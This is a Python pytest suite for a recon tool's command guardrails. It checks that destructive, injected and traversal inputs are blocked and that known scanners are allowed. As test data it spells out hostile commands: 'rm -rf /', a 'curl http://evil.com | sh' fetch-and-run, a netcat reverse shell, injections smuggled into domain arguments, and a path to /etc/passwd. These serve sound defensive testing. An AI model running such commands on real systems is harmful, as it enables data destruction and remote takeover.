"""
Alpha V6 Test Suite — Command Guardrails Tests.

Tests for:
- Dangerous pattern detection
- Unicode homograph blocking
- Shell construct detection
- Known binary validation
- Base64 payload detection
- Output path traversal blocking
"""
import pytest
from backend.tools.recon.guardrails import (
    validate_command, validate_output_path, GuardrailResult,
)


class TestDangerousPatterns:
    """Blocks dangerous command patterns."""

    def test_blocks_rm_rf_root(self):
        result = validate_command(("rm", "-rf", "/"))
        assert not result.allowed
        assert "recursive_root_deletion" in result.reason

    def test_blocks_curl_pipe_sh(self):
        result = validate_command(("bash", "-c", "curl http://evil.com | sh"))
        assert not result.allowed

    def test_blocks_netcat_reverse_shell(self):
        result = validate_command(("nc", "10.0.0.1", "4444", "-e", "/bin/sh"))
        assert not result.allowed
        assert "netcat_reverse_shell" in result.reason

    def test_blocks_python_reverse_shell(self):
        result = validate_command(("python", "-c", "import socket"))
        assert not result.allowed


class TestShellConstructs:
    """Blocks shell metacharacters in argv arrays."""

    def test_blocks_pipe(self):
        result = validate_command(("subfinder", "-d", "example.com", "|", "grep"))
        assert not result.allowed
        assert "shell_construct" in result.reason

    def test_blocks_semicolon(self):
        result = validate_command(("subfinder", "-d", "example.com; rm -rf /"))
        assert not result.allowed

    def test_blocks_command_substitution(self):
        result = validate_command(("subfinder", "-d", "$(whoami).evil.com"))
        assert not result.allowed

    def test_blocks_backtick(self):
        result = validate_command(("subfinder", "-d", "`id`.evil.com"))
        assert not result.allowed


class TestKnownBinaries:
    """Only allows known recon tool binaries."""

    def test_allows_subfinder(self):
        result = validate_command(("subfinder", "-d", "example.com", "-json"))
        assert result.allowed

    def test_allows_nmap(self):
        result = validate_command(("nmap", "-sV", "example.com"))
        assert result.allowed

    def test_allows_httpx(self):
        result = validate_command(("httpx", "-l", "hosts.txt"))
        assert result.allowed

    def test_allows_nuclei(self):
        result = validate_command(("nuclei", "-t", "cves/", "-l", "urls.txt"))
        assert result.allowed

    def test_blocks_unknown_binary(self):
        result = validate_command(("malware.exe", "--install"))
        assert not result.allowed
        assert "unknown_binary" in result.reason

    def test_blocks_powershell(self):
        result = validate_command(("powershell", "-c", "Get-Process"))
        assert not result.allowed
        assert "unknown_binary" in result.reason

    def test_blocks_cmd(self):
        result = validate_command(("cmd", "/c", "dir"))
        assert not result.allowed


class TestUnicodeHomographs:
    """Detects Unicode homograph attacks."""

    def test_blocks_cyrillic_a(self):
        # \u0430 is Cyrillic 'а' which looks like Latin 'a'
        result = validate_command(("subfinder", "-d", "\u0430dmin.example.com"))
        assert not result.allowed
        assert "homograph" in result.reason

    def test_blocks_cyrillic_o(self):
        # \u043e is Cyrillic 'о' which looks like Latin 'o'
        result = validate_command(("subfinder", "-d", "g\u043eoogle.com"))
        assert not result.allowed


class TestEmptyCommand:
    """Edge cases."""

    def test_blocks_empty(self):
        result = validate_command(())
        assert not result.allowed
        assert "empty_command" in result.reason


class TestOutputPathValidation:
    """Output path traversal prevention."""

    def test_blocks_traversal(self):
        assert not validate_output_path("../../etc/passwd")
        assert not validate_output_path("data/../../../windows/system32")

    def test_allows_scan_dir(self):
        assert validate_output_path("data/scans/scan_123/raw/output.json")

    def test_allows_project_dir(self):
        assert validate_output_path("D:\\Antigravity 2\\data\\output.json")
